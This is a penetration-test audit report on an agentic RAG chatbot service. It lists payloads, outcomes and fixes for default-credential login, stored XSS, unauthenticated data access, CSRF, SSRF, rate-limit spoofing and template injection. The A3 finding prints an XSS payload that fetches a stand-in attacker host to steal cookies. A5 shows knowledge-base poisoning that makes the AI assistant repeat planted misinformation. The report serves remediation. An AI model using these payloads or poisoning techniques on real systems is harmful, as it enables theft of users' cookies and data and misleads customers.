# Security Audit Report — Agentic RAG

**Date:** 2026-06-25
**Target:** `http://localhost:8000`
**Methodology:** Black-box penetration testing (10 attack categories, 18 individual tests)
**Tool:** `scripts/security_audit.py`

---

## Executive Summary

| Metric | Count |
|--------|-------|
| Total tests | 18 |
| Vulnerable | 7 |
| Mitigated | 10 |
| Info | 1 |

**6 critical** and **1 medium** severity vulnerabilities were identified. The most impactful findings are:

1. **Default admin credentials** — full admin panel access with `admin / change-me-now`
2. **Stored XSS in widget** — persistent JavaScript injection via `str.format()` template
3. **Zero API authentication** — any endpoint can be called without auth (leads, analytics, ingestion)
4. **Knowledge base poisoning** — arbitrary content can be injected into RAG results
5. **No CSRF protection** — admin POST endpoints vulnerable to cross-site request forgery
6. **Rate limiter bypass** — `X-Forwarded-For` spoofing defeats IP-based rate limiting

---

## Attack Summary

| # | Attack | Severity | Status | Finding |
|---|--------|----------|--------|---------|
| A1 | Default admin login | CRITICAL | Vulnerable | Login succeeded with default credentials |
| A2 | Session secret forgery | INFO | Mitigated | Forged cookie rejected (secret may differ from default) |
| A3 | Stored XSS via widget config | CRITICAL | Vulnerable | XSS payload accepted and persisted |
| A4a | Data exfil — Leads | CRITICAL | Vulnerable | Leads endpoint accessible without auth |
| A4b | Data exfil — Analytics | CRITICAL | Vulnerable | Analytics accessible without auth |
| A4c | Data exfil — Analytics detailed | INFO | Mitigated | Endpoint returned 500 |
| A5 | Knowledge base poisoning | CRITICAL | Vulnerable | Arbitrary content ingested without auth |
| A6 | Cross-brand tracking | INFO | Info | Tracking lookup returned data (same brand) |
| A7a | SSRF — AWS metadata | INFO | Mitigated | Blocked by Pydantic + CrawlerService |
| A7b | SSRF — localhost admin | INFO | Mitigated | Blocked |
| A7c | SSRF — internal Ollama | INFO | Mitigated | Blocked |
| A7d | SSRF — cloud foundry | INFO | Mitigated | Blocked |
| A8 | CSRF admin takeover | CRITICAL | Vulnerable | No CSRF token on admin POST endpoints |
| A9a | Template injection — plain `30` | INFO | Mitigated | Rendered safely (Jinja2 autoescape) |
| A9b | Template injection — `30_{0}` | INFO | Mitigated | FastAPI 422 validation |
| A9c | Template injection — `30_{totals}` | INFO | Mitigated | FastAPI 422 validation |
| A9d | Template injection — `30_{0.__class__}` | INFO | Mitigated | FastAPI 422 validation |
| A10 | Rate limit bypass | MEDIUM | Vulnerable | 40/40 requests succeeded with spoofed IPs |

---

## Detailed Findings (Vulnerable)

### A1: Default Admin Credentials [CRITICAL]

- **Payload:** `POST /admin/login` with `username=admin&password=change-me-now`
- **Response:** `302` redirect to `/admin`, followed by authenticated dashboard
- **Code locations:** `config.py:22`, `.env:16`
- **Impact:** Full admin panel access — brands CRUD, tracking overrides, source rollbacks, user data
- **Fix:** Change `ADMIN_PASSWORD` in `.env` to a strong, unique value. Force password change on first login. Implement 2FA.

### A3: Stored XSS via Widget Config [CRITICAL]

- **Payload:** `PUT /api/kalp/widget-config` with `welcome_message=<img src=x onerror="fetch('http://evil.example.com/steal?c='+document.cookie)">`
- **Response:** `200` — payload stored and persisted
- **Code locations:** `main.py:847-868` (widget template uses Python `str.format()` not Jinja2), `widget.html:83` (`d.innerHTML = text`)
- **Impact:** Every visitor to any page embedding the chat widget executes attacker-controlled JavaScript. Can steal cookies, redirect users, deface pages.
- **Fix:**
  1. Render `widget.html` via Jinja2 instead of Python `str.format()`
  2. Sanitize/allowlist all `WidgetConfig` fields server-side
  3. Add `Content-Security-Policy: script-src 'self'` header
  4. Limit widget config updates to authenticated admin only (already done, but the vulnerability exists if admin account is compromised)

### A4a: Unauthenticated Data Exfiltration — Leads [CRITICAL]

- **Payload:** `GET /api/kalp/leads?page_size=5`
- **Response:** `200` with lead data (names, emails, phones if any exist)
- **Code location:** `main.py:734-745`
- **Impact:** PII exposure — names, email addresses, phone numbers
- **Fix:** Add API key authentication to all `/api/*` endpoints. Implement per-brand API key scoping.

### A4b: Unauthenticated Data Exfiltration — Analytics [CRITICAL]

- **Payload:** `GET /api/kalp/analytics`
- **Response:** `200` with analytics summary (message counts, brand activity)
- **Code location:** `main.py:750-753`
- **Impact:** Confirms brand existence and usage patterns. Leaks business intelligence.
- **Fix:** Add API key authentication to analytics endpoints.

### A5: Knowledge Base Poisoning [CRITICAL]

- **Payload:** `POST /api/kalp/ingest/text` with `content="IMPORTANT: Kalp Foods acquired by HackerCorp..."`
- **Response:** `200` — content ingested
- **Code location:** `main.py:536-558`
- **Impact:** Attacker-controlled text appears in RAG responses. Customers receive misinformation. Reputational damage.
- **Fix:**
  1. Add authentication to all ingestion endpoints
  2. Implement content moderation / source allowlisting
  3. Rate-limit ingestion per brand/session
  4. Add human-in-the-loop review for new sources

### A8: CSRF Admin Takeover [CRITICAL]

- **Payload:** Auto-submitting HTML form to `POST /admin/brands/create`
- **Response:** No CSRF token found on `/admin/brands` page
- **Code locations:** `main.py:1093-1149, 1175-1214, 1251-1275`
- **Impact:** An attacker can trick an authenticated admin into creating brands, modifying tracking data, rolling back sources — all without the admin's knowledge.
- **Fix:**
  1. Add CSRF tokens (signed via itsdangerous) to every admin POST form
  2. Validate CSRF token on every state-changing POST
  3. Set `SameSite=Strict` on the session cookie
  4. Add `Origin`/`Referer` header validation

### A10: Rate Limit Bypass [MEDIUM]

- **Payload:** 40 rapid requests with spoofed `X-Forwarded-For` IPs
- **Response:** All 40 succeeded (`200`), zero blocked (`429`)
- **Code location:** `main.py:110` (global limiter), `main.py:313` (chat limiter)
- **Impact:** An attacker can flood the chat API, exhaust LLM credits (Groq API), or brute-force guess order IDs
- **Fix:**
  1. Do not rely on `X-Forwarded-For` for rate limiting unless behind a trusted proxy
  2. Use connection-level (actual client IP:port) rate limiting
  3. Configure `get_remote_address` to use `request.client.host` instead of `X-Forwarded-For`

---

## Detailed Findings (Mitigated)

### A2: Session Secret Forgery

- **Payload:** Forged Flask session cookie signed with known secret `replace-with-a-long-random-string`
- **Response:** `401` — cookie rejected
- **Conclusion:** Either the session secret has been changed from the default, or the exact itsdangerous parameters differ from what's configured. In production, if the default secret is left unchanged, this would be exploitable.

### A7: SSRF Bypass (all 4 targets)

- **Payload:** `POST /api/kalp/crawl` with internal IP URLs (`169.254.169.254`, `127.0.0.1:8000`, `localhost:11434`, `[::1]:8000`)
- **Response:** All returned `400` with validation errors
- **Code locations:** `schemas.py:259-267` (Pydantic validator), `crawler_service.py:27-43` (`_validate_url_external`)
- **Conclusion:** Defense-in-depth SSRF protection is working correctly.

### A9: Template Injection (all 4 variants)

- **Payload:** Various format string payloads in `days` parameter of `/admin/analytics`
- **Response:** `200` plain `30` (Jinja2 autoescape), `422` for format strings (FastAPI validation)
- **Conclusion:** The `days` query parameter has Pydantic validation (`le=365`) that blocks non-integer values. Jinja2 autoescaping is active for admin templates. However, the **widget template** (`widget.html`) bypasses Jinja2 by using Python `str.format()` — this is the real template injection vector (see A3).

---

## Recommendations (Priority Order)

| Priority | Action | Affected Code | Effort | Impact |
|----------|--------|--------------|--------|--------|
| P0 | Change `ADMIN_PASSWORD` and `SESSION_SECRET` in `.env` | `.env:16-17` | 1 min | Closes A1 |
| P0 | Render widget via Jinja2, sanitize WidgetConfig fields | `main.py:847-868`, `widget.html` | 1 day | Closes A3 |
| P0 | Add API key auth to all `/api/*` endpoints | `main.py` (all routes) | 2-3 days | Closes A4, A5 |
| P1 | Add CSRF tokens to admin POST forms | `main.py` + templates | 1 day | Closes A8 |
| P1 | Fix rate limiter IP detection | `main.py:110` | 2 hours | Closes A10 |
| P2 | Add CSP, HSTS, X-Frame-Options headers | `main.py` | 2 hours | Defense in depth |
| P2 | Add request body size limits for uploads | `main.py:563-635` | 1 hour | DoS protection |
| P3 | Regenerate session on login | `main.py:1339` | 30 min | Session fixation |
| P3 | Scope tracking lookups to current brand only | `tracking_service.py:847-857` | 1 hour | Cross-brand leakage |

---

## Script Usage

```bash
# Re-run the full audit
python scripts/security_audit.py

# The script restores modified state automatically (widget config, KB cleanup)
# Manual DB cleanup may be needed for poisoned sources
```

**Requirements:** `requests`, `itsdangerous`
